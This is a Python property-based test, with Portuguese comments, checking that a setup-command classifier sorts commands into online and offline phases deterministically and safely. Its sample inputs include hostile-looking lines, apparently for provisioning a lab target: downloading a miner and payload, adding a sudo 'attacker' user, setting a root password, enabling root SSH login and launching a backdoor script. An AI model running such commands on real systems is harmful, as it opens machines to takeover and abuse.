"""Property test — deterministic, safe-by-default online/offline classification (task 1.1).

# Feature: stage5-target-provisioning, Property 7: Classificação determinística
# online/offline é estável e segura por padrão. Para qualquer lista de comandos de
# setup (mistura de online/offline/atípicos), ``classify_commands`` é determinística
# (mesma entrada => mesma saída, preservando a ordem) e segura por padrão: todo
# comando que não casa nenhum padrão ONLINE é classificado OFFLINE (nunca abre
# egresso indevido — o pior caso é um comando offline que falha de forma contida).

Validates: Requirements 2.2, 5.1

Esta é uma property test de *feature* (``stage5-target-provisioning`` é uma
feature, não um bugfix): a propriedade é esperada **valer** sobre a implementação
atual de :func:`~app.services.environment.target_setup.classify_commands`.

A função sob teste é **pura e sem rede** — não toca Docker, internet nem IA — logo
o teste é totalmente in-memory e seguro no ambiente de dev. Os geradores do
Hypothesis produzem três famílias de comandos:

* **online** — linhas que casam explicitamente um padrão ONLINE estável
  (``apt-get install``, ``pip3 install``, ``wget``, ``curl -O``, ``git clone`` e
  download de binário por URL);
* **offline** — linhas típicas de setup sem internet (``useradd``, ``chpasswd``,
  ``cat > ... << EOF``, ``sshd &``, ``chmod``/``chown``/``mkdir``);
* **atípicas** — texto arbitrário (``st.text``) e comandos que não casam nenhum
  padrão, exercitando a regra de borda.

Um **oráculo independente** (:func:`_oracle_phase`) recomputa a fase esperada a
partir das mesmas regras do design, sem confiar na implementação para decidir o
que é "online". As asserções cobrem:

1. **Determinismo** — duas chamadas com a mesma entrada produzem saídas iguais.
2. **Preservação de ordem e comando** — a saída tem o mesmo tamanho e os mesmos
   comandos, na mesma ordem, que a entrada.
3. **Seguro por padrão** — todo comando sem padrão ONLINE vira OFFLINE.
4. **Concordância com o oráculo** — cada classificação bate com o oráculo.

_Requirements: 2.2, 5.1_
"""

from __future__ import annotations

import re

from hypothesis import given, settings
from hypothesis import strategies as st

from app.services.environment.target_setup import (
    ClassifiedCommand,
    SetupPhase,
    classify_commands,
)

# ---------------------------------------------------------------------------
# Independent oracle — the stable ONLINE patterns from the design, duplicated
# here so the assertions never trust the implementation to define "online".
# ---------------------------------------------------------------------------
_ORACLE_ONLINE_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\bapt(-get)?\s+(install|update)"),
    re.compile(r"\bpip3?\s+install"),
    re.compile(r"\bwget\b"),
    re.compile(r"\bcurl\b.*\b(-O|-o|--output)\b"),
    re.compile(r"\bgit\s+clone\b"),
    re.compile(r"https?://\S+.*>\s*\S+"),
)


def _oracle_phase(command: str) -> SetupPhase:
    """Expected phase, recomputed independently from the design's patterns."""
    if any(p.search(command) for p in _ORACLE_ONLINE_PATTERNS):
        return SetupPhase.ONLINE
    return SetupPhase.OFFLINE


# ---------------------------------------------------------------------------
# Generators — a representative mix of online, offline, and atypical commands.
# ---------------------------------------------------------------------------
_online_commands = st.sampled_from(
    [
        "apt-get install -y nmap",
        "apt install python3-pip",
        "apt-get update",
        "pip3 install --break-system-packages flask requests",
        "pip install xmrig",
        "wget https://example.com/xmrig.tar.gz",
        "curl -O https://example.com/payload.bin",
        "curl --output tool https://example.com/tool",
        "git clone https://github.com/acme/exploit.git",
        "curl https://example.com/miner > /tmp/miner",
    ]
)

_offline_commands = st.sampled_from(
    [
        "useradd -m attacker -s /bin/bash",
        "usermod -aG sudo attacker",
        "echo 'root:RootPass123' | chpasswd",
        "smbpasswd -a -s DebianUser",
        "mkdir -p /home/attacker/malware",
        "chmod +x /home/attacker/malware/backdoor.py",
        "chown attacker:attacker /home/attacker/malware/backdoor.py",
        "pgrep -x sshd > /dev/null || /usr/sbin/sshd &",
        "php-fpm8.4 &",
        "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config",
    ]
)

# Atypical: arbitrary free text plus some that deliberately match nothing.
_atypical_commands = st.one_of(
    st.text(max_size=40),
    st.sampled_from(
        [
            "",
            ": # comentario",
            "echo hello world",
            "ls -la /tmp",
            "python3 /home/attacker/malware/backdoor.py &",
            "if ! ss -tuln | grep -q ':5055 '; then true; fi",
        ]
    ),
)

_any_command = st.one_of(_online_commands, _offline_commands, _atypical_commands)

_command_lists = st.lists(_any_command, max_size=25)


@settings(max_examples=100)
@given(commands=_command_lists)
def test_classification_is_deterministic_and_safe_by_default(
    commands: list[str],
) -> None:
    # Feature: stage5-target-provisioning, Property 7: Classificação determinística
    # online/offline é estável e segura por padrão.
    first = classify_commands(commands)
    second = classify_commands(commands)

    # (1) Determinism: same input => identical output.
    assert first == second

    # (2) Order and command preserved exactly.
    assert len(first) == len(commands)
    assert [c.command for c in first] == commands
    assert all(isinstance(c, ClassifiedCommand) for c in first)

    for classified in first:
        oracle = _oracle_phase(classified.command)

        # (4) Each classification agrees with the independent oracle.
        assert classified.phase == oracle

        # (3) Safe by default: a command matching no ONLINE pattern is OFFLINE.
        matches_online = any(
            p.search(classified.command) for p in _ORACLE_ONLINE_PATTERNS
        )
        if not matches_online:
            assert classified.phase == SetupPhase.OFFLINE
